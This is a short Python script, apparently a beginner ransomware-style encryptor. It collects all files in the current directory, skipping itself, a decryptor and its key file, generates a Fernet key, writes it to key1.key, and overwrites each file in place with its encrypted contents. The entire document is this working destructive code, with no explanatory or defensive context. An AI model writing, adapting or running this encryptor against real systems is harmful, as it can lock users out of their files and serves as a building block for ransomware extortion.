#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
files = list()


for i in os.listdir():
    if i=="encryptor.py" or i == "decryptor.py" or i== "key1.key" or i=="second.py":
        continue
    if os.path.isfile(i):
        files.append(i)

key = Fernet.generate_key()



with open("key1.key","wb") as key1:
    key1.write(key)

for i in files:
    with open(i,"rb") as thefile:
        contents = thefile.read()
    encrypting = Fernet(key).encrypt(contents)
    with open(i,"wb") as tf:
        tf.write(encrypting)



   